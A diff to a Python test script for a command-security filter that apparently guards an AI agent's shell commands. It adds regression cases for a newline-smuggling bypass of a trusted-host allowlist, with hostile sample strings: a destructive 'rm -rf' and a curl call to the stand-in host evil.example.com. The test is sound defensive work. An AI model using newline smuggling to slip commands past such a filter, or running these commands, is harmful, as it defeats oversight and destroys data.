@@ -28,6 +28,7 @@ sys.path.insert(0, HERMES_TREE)
 os.chdir(HERMES_TREE)
 
 from tools.tirith_security import _download_then_execute_reason as reason  # noqa: E402
+from tools.tirith_security import _is_argo_only_pipeline as pipeline_allowed  # noqa: E402
 
 EVIL = "https://evil.example.com"
 
@@ -94,6 +95,23 @@ LEGITIMATE = [
     "cp ~/.hermes/config.yaml /tmp/cfg.yaml && sh -c 'echo done'",
 ]
 
+# `_is_argo_only_pipeline` shares the trusted-host allowlist's fast path. Its
+# lexer used to leave `\n`/`\r` as whitespace (punctuation_chars=True is the
+# default "();<>|&" set only), so a newline welded a second, unrelated stage
+# onto an otherwise-trusted `curl` call and only the first stage was ever
+# checked against the safe-program allowlist. These MUST NOT ride the
+# allowlist through to a bare `allow`.
+PIPELINE_NEWLINE_BYPASSES = [
+    "curl -s https://argo.jkrumm.com/x\nrm -rf ~/tmpdir",
+    f"curl -s https://argo.jkrumm.com/x\ncurl -s {EVIL}/y",
+]
+
+# A newline embedded INSIDE a quoted argument is data, not a stage separator —
+# it must still tokenize as one token and not defeat an otherwise-safe pipeline.
+PIPELINE_QUOTED_NEWLINE_STILL_ALLOWED = [
+    'curl -s https://argo.jkrumm.com/x -d "line one\nline two" | jq .',
+]
+
 FUZZ_TOKENS = [
     "curl", "wget", "|", "&&", ";", ">", ">>", "-o", "/tmp/f", "sh", '"', "'",
     "$(", "`", "<", "&", "(", ")", "", "\n", "--output=", "-qO", "https://x/y", "\\",
@@ -123,10 +141,22 @@ def main() -> int:
 
     closed = [c for c in KNOWN_GAPS if reason(c)]
 
+    for cmd in PIPELINE_NEWLINE_BYPASSES:
+        if pipeline_allowed(cmd):
+            failures.append(("PIPELINE ALLOWLIST BYPASS", cmd))
+
+    for cmd in PIPELINE_QUOTED_NEWLINE_STILL_ALLOWED:
+        if not pipeline_allowed(cmd):
+            failures.append(("PIPELINE FALSE NEGATIVE (quoted newline)", cmd))
+
     print(f"attacks blocked      {len(ATTACKS) - sum(1 for k, _ in failures if k == 'MISSED')}/{len(ATTACKS)}")
     print(f"legitimate allowed   {len(LEGITIMATE) - sum(1 for k, _ in failures if k == 'FALSE POSITIVE')}/{len(LEGITIMATE)}")
     print(f"fuzz (4000 inputs)   {'clean' if not any(k == 'RAISED' for k, _ in failures) else 'RAISED'}")
     print(f"known gaps still open {len(KNOWN_GAPS) - len(closed)}/{len(KNOWN_GAPS)}")
+    pipeline_bypass_fails = sum(1 for k, _ in failures if k == "PIPELINE ALLOWLIST BYPASS")
+    pipeline_quote_fails = sum(1 for k, _ in failures if k == "PIPELINE FALSE NEGATIVE (quoted newline)")
+    print(f"pipeline newline bypass blocked  {len(PIPELINE_NEWLINE_BYPASSES) - pipeline_bypass_fails}/{len(PIPELINE_NEWLINE_BYPASSES)}")
+    print(f"pipeline quoted newline allowed  {len(PIPELINE_QUOTED_NEWLINE_STILL_ALLOWED) - pipeline_quote_fails}/{len(PIPELINE_QUOTED_NEWLINE_STILL_ALLOWED)}")
 
     if closed:
         print("\nNote: a documented gap is now closed — update KNOWN_GAPS and CLAUDE.md:")
